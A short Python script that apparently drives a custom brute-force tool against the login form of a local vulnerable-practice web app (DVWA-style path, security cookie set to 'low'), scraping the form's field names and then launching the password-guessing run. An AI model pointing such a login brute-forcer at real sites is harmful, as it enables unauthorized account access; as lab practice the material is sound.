from lib.forcebrute.bruteforce import Bruteforce
import forms.forms as forms
import json
print()
cookies = {
    "security" : "low",
    "security_level" : "0",
    "PHPSESSID" : "e1pio97nsrkplvjht5hohim066"
}
forms_info = forms.main("http://localhost/vulnerabilities/brute/", cookies=cookies)
print(json.dumps(forms_info, indent=4))
for form in forms_info:
    for i in form['inputs']:
        if i['type'] == "text":
            login_name = i['name']
        elif i['type'] == "password":
            password_name = i['name']

payload_info = {
    "login_name" : login_name,
    "password_name" : password_name,
    "submit_name" : forms_info[0]["submit"]["name"],
    "submit_value" : forms_info[0]["submit"]["value"]
}

print(json.dumps(payload_info, indent=4))

brute = Bruteforce("http://localhost/vulnerabilities/brute/","GET", {'Content-Type': 'application/x-www-form-urlencoded'}, payload_info , 0, cookies)
brute.run()

